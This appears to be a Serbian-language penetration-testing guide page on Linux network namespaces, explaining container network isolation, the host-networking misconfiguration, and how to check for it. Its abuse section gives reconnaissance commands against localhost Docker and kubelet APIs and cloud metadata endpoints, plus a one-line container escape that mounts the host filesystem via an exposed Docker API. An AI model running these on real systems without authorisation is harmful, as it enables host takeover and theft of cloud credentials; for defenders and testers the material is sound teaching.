# Mrežni namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mrežni namespace izoluju resurse vezane za mrežu kao što su interfejsi, IP adrese, tabele rutiranja, ARP/neighbor stanje, firewall pravila, sockets i sadržaj fajlova poput `/proc/net`. Zato kontejner može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj bez posedovanja stvarnog mrežnog stacka hosta.

Sa stanovišta bezbednosti, ovo je važno jer izolacija mreže znači mnogo više od vezivanja portova. Privatni mrežni namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, kontejner može iznenada dobiti vidljivost u host listens, host-local servise i mrežne kontrolne tačke koje nikada nisu bile namenjene aplikaciji.

## Funkcionisanje

Novokreirani mrežni namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem dok mu se ne prikače interfejsi. Runtime-i kontejnera potom kreiraju ili povezuju virtuelne interfejse, dodeljuju adrese i konfigurišu rute tako da aplikacija ima očekivanu konektivnost. U bridge-based deployments, to obično znači da kontejner vidi veth-backed interfejs povezan na host bridge. U Kubernetes, CNI plugins obavljaju ekvivalentno podešavanje za Pod networking.

Ova arhitektura objašnjava zašto je `--network=host` ili `hostNetwork: true` tako dramatična promena. Umesto da dobije pripremljen privatni mrežni stack, workload se pridružuje stvarnom mrežnom stacku hosta.

## Lab

Možete videti gotovo prazan mrežni namespace sa:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Možete uporediti normalne i host-networked kontejnere pomoću:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontejner koji koristi host network više nema sopstveni izolovani prikaz soketa i interfejsa. Sama ta promena je već značajna pre nego što uopšte pitate koje capabilities proces ima.

## Runtime Usage

Docker i Podman obično kreiraju privatni network namespace za svaki kontejner, osim ako nije drugačije konfigurisan. Kubernetes obično daje svakom Pod-u sopstveni network namespace, koji je deljen između kontejnera unutar tog Poda ali odvojen od hosta. Incus/LXC sistemi takođe pružaju robusnu izolaciju zasnovanu na network namespace-ima, često sa većom raznovrsnošću virtuelnih mrežnih podešavanja.

Uobičajeno načelo je da je privatno umrežavanje podrazumevana granica izolacije, dok je host networking eksplicitno odustajanje od te granice.

## Misconfigurations

Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi zbog performansi, niskonivovskog nadgledanja ili pogodnosti, ali uklanja jednu od najčistijih granica dostupnih kontejnerima. Slušači vezani za host postaju dostupniji direktnijim putem, localhost-only servisi mogu postati pristupačni, a capabilities kao što su `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na samo host mrežno okruženje.

Drugi problem je prekomerno dodeljivanje network-related capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw sockets ili naprednu kontrolu mreže bezopasnim.

U Kubernetes-u, `hostNetwork: true` takođe menja koliko se možete osloniti na Pod-level network segmentation. Kubernetes dokumentuje da mnogi network plugin-ovi ne mogu ispravno razlikovati `hostNetwork` Pod traffic za `podSelector` / `namespaceSelector` matching i stoga ga tretiraju kao običan node traffic. Iz ugla napadača, to znači da kompromitovan `hostNetwork` workload često treba tretirati kao node-level network foothold, a ne kao normalan Pod i dalje ograničen istim pretpostavkama politike kao overlay-network workload-i.

## Abuse

U slabo izolovanim okruženjima, napadači mogu pregledati host listening services, doći do management endpoint-a vezanih samo za loopback, sniffovati ili ometati saobraćaj zavisno od tačnih capabilities i okruženja, ili rekonfigurisati routing i firewall stanje ako je prisutan `CAP_NET_ADMIN`. U klasteru, ovo takođe može olakšati lateralno kretanje i control-plane reconnaissance.

Ako sumnjate na host networking, počnite potvrdom da vidljivi interfejsi i listener-i pripadaju hostu, a ne izolovanoj kontejnerskoj mreži:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Servisi dostupni samo na loopback interfejsu često su prvo zanimljivo otkriće:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ako su prisutne mrežne mogućnosti, testirajte da li workload može da pregleda ili izmeni vidljivi stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Na modernim kernelima, host networking uz `CAP_NET_ADMIN` može takođe izložiti putanju paketa izvan jednostavnih promena `iptables` / `nftables`. `tc` qdiscs i filteri su takođe namespace-scoped, pa se u deljenom host network namespace-u primenjuju na host interfejse koje kontejner može videti. Ako je dodatno prisutan `CAP_BPF`, eBPF programi povezani sa mrežom, kao što su TC i XDP loaderi, takođe postaju relevantni:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ovo je važno zato što napadač može da preslika, preusmeri, oblikuje ili odbaci saobraćaj na nivou host interfejsa, a ne samo da prepiše firewall rules. U privatnom network namespace-u te radnje su ograničene na prikaz containera; u deljenom host namespace-u postaju uticajne po host.

U cluster ili cloud okruženjima, host networking takođe opravdava brzo lokalno izviđanje metapodataka i servisa povezanih sa control-plane-om:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Kompletan primer: Host networking + Local Runtime / Kubelet pristup

Host networking ne obezbeđuje automatski host root, ali često izlaže servise koji su namerno dostupni samo sa samog noda. Ako je jedan od tih servisa slabo zaštićen, host networking postaje direktan privilege-escalation path.

Docker API na localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhostu:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- direktno kompromitovanje hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
- izviđanje klastera ili lateralno kretanje ako je kubelet ili lokalni agenti dostupni
- manipulacija saobraćajem ili denial of service kada se kombinuje sa `CAP_NET_ADMIN`

## Provere

Cilj ovih provera je da se utvrdi da li proces ima privatni network stack, koje rute i listeners su vidljive, i da li mrežni prikaz već izgleda host-like pre nego što uopšte testirate capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Zanimljivo ovde:

- Ako `/proc/self/ns/net` i `/proc/1/ns/net` već izgledaju kao host, container možda deli host network namespace ili neki drugi neprivatan namespace.
- `lsns -t net` i `ip netns identify` su korisni kada je shell već unutar imenovanog ili persistentnog namespace-a i želite da ga povežete sa `/run/netns` objektima sa host strane.
- `ss -lntup` je posebno koristan jer otkriva slušače vezane samo za loopback i lokalne management endpoint-e.
- Rute, nazivi interfejsa, firewall kontekst, `tc` stanje i eBPF attachment-i postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN`, `CAP_NET_RAW` ili `CAP_BPF`.
- U Kubernetesu, neuspeh rešavanja imena servisa iz `hostNetwork` Pod-a može jednostavno značiti da Pod ne koristi `dnsPolicy: ClusterFirstWithHostNet`, a ne da servis ne postoji.

Kada pregledate container, uvek procenjujte network namespace zajedno sa skupom capabilities. Host networking u kombinaciji sa snažnim network capabilities predstavlja znatno drugačiji bezbednosni položaj od bridge networkinga sa ograničenim podrazumevanim skupom capabilities.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
